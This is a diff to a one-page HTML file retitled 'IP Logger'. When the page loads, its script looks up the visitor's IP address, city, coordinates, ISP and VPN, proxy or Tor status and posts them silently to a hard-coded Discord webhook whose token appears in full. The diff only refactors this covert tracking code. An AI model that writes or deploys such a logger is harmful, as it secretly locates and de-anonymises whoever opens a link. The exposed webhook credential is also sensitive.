@@ -3,10 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>3am</title>
+    <title>IP Logger</title>
 </head>
 <body>
     <script>
+        const webhookURL = "https://discord.com/api/webhooks/1335135046633525330/lu2M-H2A36_E_68tGUVcgQnwqInav48znOPlRR6R-_GuFGWyHEdyE4-S32eAArllrh4X";
+
         fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
@@ -15,54 +17,60 @@
         })
         .then(res => res.json())
         .then(data => {
+            // Check if data structure matches expected fields
+            if (!data.data) {
+                throw new Error("Unexpected response structure");
+            }
+
+            const info = data.data;
+
             const payload = {
                 content: `**IP Information:**\n` +
                          `--------------------------\n` +
-                         `**IP Address:** ${data.ip}\n` +
-                         `**Location:** ${data.city}, ${data.region}, ${data.country}\n` +
-                         `**Coordinates:** ${data.loc}\n` +
-                         `**Organization:** ${data.org}\n\n` +
-    
+                         `**IP Address:** ${info.ip || 'N/A'}\n` +
+                         `**Location:** ${info.city || 'N/A'}, ${info.region || 'N/A'}, ${info.country || 'N/A'}\n` +
+                         `**Coordinates:** ${info.loc || 'N/A'}\n` +
+                         `**Organization:** ${info.org || 'N/A'}\n\n` +
+
                          `**Network Details:**\n` +
                          `--------------------------\n` +
-                         `**ASN:** ${data.asn?.asn || 'N/A'}\n` +
-                         `**ASN Name:** ${data.asn?.name || 'N/A'}\n` +
-                         `**ASN Domain:** ${data.asn?.domain || 'N/A'}\n` +
-                         `**ASN Route:** ${data.asn?.route || 'N/A'}\n` +
-                         `**ASN Type:** ${data.asn?.type || 'N/A'}\n\n` +
-    
+                         `**ASN:** ${info.asn?.asn || 'N/A'}\n` +
+                         `**ASN Name:** ${info.asn?.name || 'N/A'}\n` +
+                         `**ASN Domain:** ${info.asn?.domain || 'N/A'}\n` +
+                         `**ASN Route:** ${info.asn?.route || 'N/A'}\n` +
+                         `**ASN Type:** ${info.asn?.type || 'N/A'}\n\n` +
+
                          `**Company Details:**\n` +
                          `--------------------------\n` +
-                         `**Company Name:** ${data.company?.name || 'N/A'}\n` +
-                         `**Company Domain:** ${data.company?.domain || 'N/A'}\n` +
-                         `**Company Type:** ${data.company?.type || 'N/A'}\n\n` +
-    
+                         `**Company Name:** ${info.company?.name || 'N/A'}\n` +
+                         `**Company Domain:** ${info.company?.domain || 'N/A'}\n` +
+                         `**Company Type:** ${info.company?.type || 'N/A'}\n\n` +
+
                          `**Connection Type:**\n` +
                          `--------------------------\n` +
-                         `**Anycast:** ${data.anycast || false}\n` +
-                         `**Mobile:** ${data.mobile || false}\n` +
-                         `**Anonymous:** ${data.privacy?.anonymous || false}\n` +
-                         `**Satellite:** ${data.privacy?.satellite || false}\n` +
-                         `**Hosting Service:** ${data.privacy?.hosting || false}\n\n` +
-    
+                         `**Anycast:** ${info.is_anycast || false}\n` +
+                         `**Mobile:** ${info.is_mobile || false}\n` +
+                         `**Anonymous:** ${info.is_anonymous || false}\n` +
+                         `**Satellite:** ${info.is_satellite || false}\n` +
+                         `**Hosting Service:** ${info.is_hosting || false}\n\n` +
+
                          `**Privacy Details:**\n` +
                          `--------------------------\n` +
-                         `**Using VPN:** ${data.privacy?.vpn || false}\n` +
-                         `**Using Proxy:** ${data.privacy?.proxy || false}\n` +
-                         `**Using Tor:** ${data.privacy?.tor || false}\n` +
-                         `**Relay Enabled:** ${data.privacy?.relay || false}\n` +
-                         `**Hosting Provider:** ${data.privacy?.service || 'N/A'}`
+                         `**Using VPN:** ${info.privacy?.vpn || false}\n` +
+                         `**Using Proxy:** ${info.privacy?.proxy || false}\n` +
+                         `**Using Tor:** ${info.privacy?.tor || false}\n` +
+                         `**Relay Enabled:** ${info.privacy?.relay || false}\n` +
+                         `**Hosting Provider:** ${info.privacy?.service || 'N/A'}`
             };
-    
-            return fetch('https://discord.com/api/webhooks/1335135046633525330/lu2M-H2A36_E_68tGUVcgQnwqInav48znOPlRR6R-_GuFGWyHEdyE4-S32eAArllrh4X', {
+
+            return fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
         })
-        .then(() => console.log("IP Info Sent Successfully"))
-        .catch(err => console.error("Error:", err));
-    
+        .then(() => console.log("✅ IP Info Sent Successfully"))
+        .catch(err => console.error("❌ Error:", err));
     </script>
 </body>
 </html>
